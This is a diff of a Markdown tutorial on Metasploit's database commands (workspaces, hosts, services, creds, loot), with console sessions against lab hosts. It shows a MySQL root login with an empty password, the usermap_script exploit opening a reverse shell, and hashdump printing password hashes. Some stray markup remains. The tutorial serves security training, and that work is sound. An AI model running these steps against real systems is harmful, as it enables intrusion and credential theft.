@@ -13,7 +13,7 @@ tags:
   - cybersecurity
   - metasploit framework
 linkTitle: Database Usage
-translation_key: msf-database-usage
+translationKey:: msf-database-usage
 ---
 Within the Metasploit Framework, the database feature offered with Postgresql support is very useful and records the scan results in one place. Recording the results found makes it easier to transfer information such as IP addresses, port numbers or Hash Dump etc. to exploits to be used in the next steps.
 
@@ -32,7 +32,7 @@ After starting postgresql, the database should be prepared for initial use. For 
 ```bash
 root@kali:~# msfdb init
 Creating database user 'msf'
-Enter password **for **new role:
+Enter password for **new role:
 Enter it again:
 Creating databases 'msf' and 'msf_test'
 Creating configuration file **in** /usr/share/metasploit-framework/config/database.yml
@@ -112,8 +112,8 @@ Usage:
 workspace List workspaces
 workspace -v List workspaces verbosely
 workspace **[**name] Switch workspace
-workspace -a **[**name] ... Add workspace**(**s**)**
-workspace -d **[**name] ... Delete workspace**(**s**)**
+workspace -a **[**name] ... Add workspace(s)
+workspace -d **[**name] ... Delete workspace(s)
 workspace -D Delete all workspaces
 workspace -r Rename workspace
 workspace -h Show this help information
@@ -134,19 +134,19 @@ Database Backend Commands
 
 Command Description
 ------- -----------
-credits List all credentials **in **the database
+credits List all credentials **in the database
 db_connect Connect to an existing database
 db_disconnect Disconnect from the current database instance
 db_export Export a file containing the contents of the database
-db_import Import a scan result file **(**filetype will be auto-detected**)**
+db_import Import a scan result file (filetype will be auto-detected)
 db_nmap Executes nmap and records the output automatically
 db_rebuild_cache Rebuilds the database-stored module cache
 db_status Show the current database status
-hosts List all hosts **in **the database
-loot List all loot **in **the database
-notes List all notes **in **the database
-services List all services **in **the database
-vulns List all vulnerabilities **in **the database
+hosts List all hosts **in the database
+loot List all loot **in the database
+notes List all notes **in the database
+services List all services **in the database
+vulns List all vulnerabilities **in the database
 workspace Switch between database workspaces
 ```
 
@@ -186,7 +186,7 @@ You can import nmap scan results from outside or inside with `msfconsole` You ca
 msf > db_nmap -A 172.16.194.134
 > Nmap: Starting Nmap 5.51SVN (<a href="http://nmap.org/">http://nmap.org</a> ) at 2012-06-18 12:36 EDT
 > Nmap: Nmap scan report for 172.16.194.134
-> Nmap: Host is up **(**0.00031s latency**)**.
+> Nmap: Host is up (0.00031s latency).
 > Nmap: Not shown: 994 closed ports
 > Nmap: PORT STATE SERVICE VERSION
 > Nmap: 80/tcp open http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4
@@ -196,7 +196,7 @@ msf > db_nmap -A 172.16.194.134
 > Nmap: HOP RTT ADDRESS
 > Nmap: 1 0.31 ms 172.16.194.134
 > Nmap: OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
-> Nmap: Nmap **done**: 1 IP address **(**1 host up**)** scanned **in **14.91 seconds
+> Nmap: Nmap **done**: 1 IP address (1 host up) scanned **in **14.91 seconds
 msf >
 
 
@@ -257,7 +257,7 @@ Usage: hosts **[** options **]** **[**addr1 addr2 ...]
 OPTIONS:
  -a,--add Add the hosts instead of searching
  -d,--delete Delete the hosts instead of searching
- -c Only show the given columns **(**see list below**)**
+ -c Only show the given columns (see list below)
  -h,--help Show this help information
  -u,--up Only show hosts which are up
  -o Send output to a file **in **csv format
@@ -310,17 +310,17 @@ msf >
 Here we found the IP Address we will use. Now let's go into a module and look at the variables the module needs.
 
 ```bash
-msf auxiliary**(**tcp**)** > show options
+msf auxiliary(tcp) > show options
 
-Module options **(**auxiliary/scanner/portscan/tcp**)**:
+Module options (auxiliary/scanner/portscan/tcp):
 
  Name Current Setting Required Description
  ---- --------------- -------- -----------
  CONCURRENCY 10 yes The number of concurrent ports to check per host
- FILTER no The filter string **for **capturing traffic
+ FILTER no The filter string for **capturing traffic
  INTERFACE no The name of the interface
  PCAPFILE no The name of the PCAP capture file to process
- PORTS 1-10000 yes Ports to scan **(**e.g. 22-25,80,110-900**)**
+ PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
  RHOSTS yes The target address range or CIDR identifier
  SNAPLEN 65535 yes The number of bytes to capture
  THREADS 1 yes The number of concurrent threads
@@ -332,7 +332,7 @@ In the output above, the RHOSTS variable is seen as empty. The Remote Host IP ad
 In this case, we can transfer the IP address we found with the search we made with the command `hosts -c address,os_flavor -S Linux` directly to the module we are in by adding the `-R` parameter to the end. As seen in the example below, the “Ubuntu” IP address is directly transferred to the `tcp` module.
 
 ```bash
-msf auxiliary**(**tcp**)** > hosts -c address,os_flavor -S Linux -R
+msf auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R
 
 Hosts
 **=====**
@@ -341,9 +341,9 @@ address os_flavor
 ------- ---------
 172.16.194.172 Ubuntu
 
-RHOSTS **=>** 172.16.194.172
+RHOSTS => 172.16.194.172
 
-msf auxiliary**(**tcp**)** > run
+msf auxiliary(tcp) > run
 
 > 172.16.194.172:25 - TCP OPEN
 > 172.16.194.172:23 - TCP OPEN
@@ -362,14 +362,14 @@ msf auxiliary**(**tcp**)** > run
 > 172.16.194.172:8009 - TCP OPEN
 > 172.16.194.172:8180 - TCP OPEN
 > 172.16.194.172:8787 - TCP OPEN
-> Scanned 1 of 1 hosts **(**100% complete**)**
+> Scanned 1 of 1 hosts (100% complete)
 > Auxiliary module execution completed
 ```
 
 Without filtering the hosts list, we can also transfer all the available IP addresses to the active module. In this case, it will be sufficient to give only the `-R` parameter to the `hosts` command without entering any search expression.
 
 ```bash
-msf  auxiliary**(**tcp**)** > hosts -R
+msf  auxiliary(tcp) > hosts -R
 
 Hosts
 **=====**
@@ -379,19 +379,19 @@ address         mac                name  os_name            os_flavor  os_sp  pu
 172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
 172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         
 
-RHOSTS **=>** 172.16.194.134 172.16.194.172
+RHOSTS => 172.16.194.134 172.16.194.172
 
-msf  auxiliary**(**tcp**)** > show options
+msf  auxiliary(tcp) > show options
 
-Module options **(**auxiliary/scanner/portscan/tcp**)**:
+Module options (auxiliary/scanner/portscan/tcp):
 
    Name         Current Setting                Required  Description
    ----         ---------------                --------  -----------
    CONCURRENCY  10                             yes       The number of concurrent ports to check per host
-   FILTER                                      no        The filter string **for **capturing traffic
+   FILTER                                      no        The filter string for **capturing traffic
    INTERFACE                                   no        The name of the interface
    PCAPFILE                                    no        The name of the PCAP capture file to process
-   PORTS        1-10000                        yes       Ports to scan **(**e.g. 22-25,80,110-900**)**
+   PORTS        1-10000                        yes       Ports to scan (e.g. 22-25,80,110-900)
    RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
    SNAPLEN      65535                          yes       The number of bytes to capture
    THREADS      1                              yes       The number of concurrent threads
@@ -417,8 +417,8 @@ Usage: services **[**-h**]** **[**-u**]** **[**-a**]** **[**-r **]** **[**-p >po
  -d,--delete Delete the services instead of searching
  -c Only show the given columns
  -h,--help Show this help information
- -s Search **for **a list of service names
- -p Search **for **a list of ports
+ -s Search for **a list of service names
+ -p Search for **a list of ports
  -r Only show **[**tcp|udp] services
  -u,--up Only show services which are up
  -o Send output to a file **in **csv format
@@ -442,10 +442,10 @@ Services
 
 hostname info
 ---- ---- ----
-172.16.194.134 http Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
+172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134 msrpc Microsoft Windows RPC
 172.16.194.134 netbios-ssn
-172.16.194.134 http Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
+172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
 172.16.194.134 microsoft-ds Microsoft Windows XP microsoft-ds
 172.16.194.134 mysql
 ```
@@ -460,9 +460,9 @@ Services
 
 host name info
 ---- ---- ----
-172.16.194.134 http Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
-172.16.194.134 http Apache httpd 2.2.17 **(**Win32**)** mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
-172.16.194.172 http Apache httpd 2.2.8 **(**Ubuntu**)** DAV/2
+172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
+172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
+172.16.194.172 http Apache httpd 2.2.8 (Ubuntu) DAV/2
 172.16.194.172 http Apache Tomcat/Coyote JSP engine 1.1
 ```
 
@@ -575,16 +575,16 @@ host port user pass type active?
 Just as the results found in searches made with the `db_nmap` command are kept in the `hosts` and `services` tables, the information you obtain when you use any username and password finding module is also kept in the `creds` table. Let's see an example. In this example, the `mysql_login` module is run and an attempt is made to log in to the MySql service running at the 172.16.194.172 IP address. When successful, the successful username and password information is recorded in the `creds` table for later use.
 
 ```bash
-msf auxiliary**(**mysql_login**)** > run
+msf auxiliary(mysql_login) > run
 
 > 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
 > 172.16.194.172:3306 MYSQL - **[**1/2] - Trying username:'root' with password:''
 > 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
-> Scanned 1 of 1 hosts **(**100% complete**)**
+> Scanned 1 of 1 hosts (100% complete)
 > Auxiliary module execution completed
 
 
-msf auxiliary**(**mysql_login**)** > creds
+msf auxiliary(mysql_login) > creds
 
 Credentials
 **===========**
@@ -594,7 +594,7 @@ host port user pass type active?
 172.16.194.172 3306 root password true
 
 >Found 1 credential.
-msf auxiliary**(**mysql_login**)** >
+msf auxiliary(mysql_login) >
 ```
 
 ### Manually Adding Data to the Creds Table
@@ -632,7 +632,7 @@ Usage: loot
  -d,--delete Delete *****all***** loot matching host and type
  -f,--file File with contents of the loot to add
  -i,--info Info of the loot to add
- -t Search **for **a list of types
+ -t Search for **a list of types
  -h,--help Show this help information
  -S,--search Search string to filter by
 ```
@@ -640,7 +640,7 @@ Usage: loot
 Then, using the **usermap_script** module, a session is opened on the opposite system and the hash values ​​for the opened session are found with the **hashdump** module. If successful, the found hash values ​​are recorded in the `loot` table for later use.
 
 ```bash
-msf exploit**(**usermap_script**)** > exploit
+msf exploit(usermap_script) > exploit
 
 > Started reverse double handler
 > Accepted the first client connection...
@@ -653,30 +653,30 @@ msf exploit**(**usermap_script**)** > exploit
 > B: "4uGPYOrars5OojdL\r "
 >Matching...
 > A is input...
-> Command shell session 1 opened **(**172.16.194.163:4444 -> 172.16.194.172:55138**)** at 2012-06-27 19:38:54 -0400
+> Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400
 
 ^Z
 Background session 1? **[**y/N] y
 
-msf  exploit**(**usermap_script**)** > use post/linux/gather/hashdump
-msf  post**(**hashdump**)** > show options
+msf  exploit(usermap_script) > use post/linux/gather/hashdump
+msf  post(hashdump) > show options
 
-Module options **(**post/linux/gather/hashdump**)**:
+Module options (post/linux/gather/hashdump):
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SESSION  1                yes       The session to run this module on.
 
-msf  post**(**hashdump**)** > sessions -l
+msf  post(hashdump) > sessions -l
 
 Active sessions
 **===============**
 
   Id  Type        Information  Connection
   --  ----        -----------  ----------
-  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 **(**172.16.194.172**)**
+  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)
 
-msf  post**(**hashdump**)** > run
+msf  post(hashdump) > run
 
 **[**+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
 **[**+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
@@ -692,7 +692,7 @@ msf  post**(**hashdump**)** > run
 To see the hash values ​​stored in the database `loot` Just give the command.
 
 ```bash
-msf post**(**hashdump**)** > loot
+msf post(hashdump) > loot
 
 loot
 **====**
